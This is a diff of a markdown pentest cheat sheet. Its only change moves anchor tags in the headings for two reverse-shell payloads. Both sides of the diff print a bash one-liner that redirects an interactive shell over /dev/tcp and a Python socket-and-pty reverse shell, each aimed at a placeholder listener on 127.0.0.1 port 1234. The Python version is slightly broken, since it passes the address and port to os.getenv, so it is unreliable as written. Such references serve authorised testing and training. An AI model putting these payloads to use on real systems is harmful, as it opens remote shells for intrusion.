@@ -63,11 +63,11 @@ ____
 
 ____
 
-### Reverse shell > bash
-<a name="reverse_shell_bash"></a>bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
+### Reverse shell > <a name="reverse_shell_bash"></a>bash
+bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
 
-### Reverse shell > Python
-```python <a name="reverse_shell_python"></a>python -c 'import sys,socket,os,pty;s=socket.socket()  
+### Reverse shell > <a name="reverse_shell_python"></a>Python
+```python python -c 'import sys,socket,os,pty;s=socket.socket()  
 s.connect((os.getenv("127.0.0.1"),int(os.getenv("1234"))))  
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]  
 pty.spawn("/bin/sh")'
